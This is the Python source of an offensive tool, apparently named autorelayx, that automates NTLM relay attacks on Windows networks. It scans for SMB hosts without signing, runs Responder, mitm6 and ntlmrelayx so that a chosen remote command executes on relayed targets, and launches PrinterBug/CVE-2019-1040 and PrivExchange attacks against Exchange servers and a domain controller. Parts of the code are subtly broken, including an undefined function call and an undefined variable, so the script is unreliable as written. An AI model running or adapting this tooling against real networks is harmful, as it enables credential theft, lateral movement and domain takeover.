#!/usr/bin/env python3

import asyncio
import argparse
import sys
import signal
from src.utils import *
from src.tools import *
from src.smb import get_unsigned_hosts
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
    parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
    parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
    parser.add_argument("-ef", "--exchange-file", help="Exchange server IP addresses file")
    parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic and PrivExchange attacks")
    parser.add_argument("--privexchange", action="store_true", help="Skip the Drop the Mic attack and just perform PrivExchange")
    return parser.parse_args()

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

def parse_exchange_scan(proc):
    hosts = []
    for l in proc.stdout:
        if "is VULNERABLE" in l:
            host = l.split()[1]
            hosts.append(host)
    return hosts

def cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange):
    """
    Catch CTRL-C and kill procs
    """
    print_info('CTRL-C caught, cleaning up and closing')

     # Kill procs
    if responder:
        print_info('Killing Responder')
        responder.kill()
    if privexchange:
        print_info('Killing privexchange')
        privexchange.kill()
    if ntlmrelayx:
        print_info('Killing ntlmrelayx')
        ntlmrelayx.kill()
    if printerbug:
        print_info('Killing printerbug')
        printerbug.kill()
    if mitm6:
        print_info('Killing mitm6, may take a minute')
        mitm6.kill()

    time.sleep(3)

    try:
        os.remove(f'{cwd}/arp.cache')
    except FileNotFoundError:
        pass

    print_good('Done')
    sys.exit()

def fix_exch_args(missing_arg):
    print_bad(f"Must specify a list of exchange servers with the {missing_arg} argument")
    print_bad("Example: python autorelayx.py -u LAB/dan:Passw0rd -ef <exchange_servers.txt> -dc <192.168.0.100>")
    sys.exit()

def fix_relay_args():
    print_bad(f"Must specify a list of hosts to test for SMB signing with -l <hostlist.txt> or a target file which won't"
              f" be tested for SMB signing with -tf <target_file.txt>")
    print_bad("Example: python autorelayx.py -l hostlist.txt")
    sys.exit()

def exchange_attacks(args, local_ip):
    printerbug = None
    privexchange = None

    if not args.exchange_file:
        fix_args('-ef')
    elif not args.domain_controller:
        fix_args('-dc')

    if not args.privexchange:
        print_info("Testing Exchange servers for CVE-2019-1040 (PrinterBug)")
        scan = start_exchange_scan(args)
        vuln_hosts = parse_exchange_scan(scan)

        if len(vuln_hosts) > 0:
            exchange_server = vuln_hosts[0]
            printerbug = start_printerbug(args.user, exchange_server, local_ip)

            return printerbug, privexchange

        else:
            print_bad("No Exchange servers found vulnerable to SpoolService bug, attempting PrivExchange attack")

    # Run PrivExchange
    privexchange = start_privexchange(args, local_ip)

    return printerbug, privexchange

async def relay_attacks(args, iface):
    mitm6 = None

    if not args.hostlist and not args.target_file:
        fix_relay_args()

    if args.hostlist:
        hostlist = args.hostlist
        hosts = parse_hostlist(hostlist)
        print_info("Checking for unsigned SMB hosts")
        unsigned_hosts = await get_unsigned_hosts(loop, hosts)

        if len(unsigned_hosts) == 0:
            print_bad('No hosts with SMB signing disabled found, NTLM relaying will fail')

        if len(unsigned_hosts) > 0:
            print_good('Unsigned SMB hosts:')
            for h in unsigned_hosts:
                print_good('  ' + h)

    # Start Responder
    responder = start_responder(iface)

    # Start mitm6
    if args.mitm6:
        mitm6 = start_mitm6(args)

    return responder, mitm6

async def main():
    responder = None
    mitm6 = None
    printerbug = None
    privexchange = None

    iface, local_ip = get_iface_and_ip(args)

    if args.user:
        printerbug, privexchange = exchange_attacks(args, local_ip)

    else:
        responder, mitm6 = await relay_attacks(args, iface)

    # Start ntlmrelayx
    ntlmrelayx = start_ntlmrelayx(args)

    cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange)

if __name__ == "__main__":

    if os.geteuid():
        print_bad('Run as root')
        sys.exit()

    args = parse_args()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()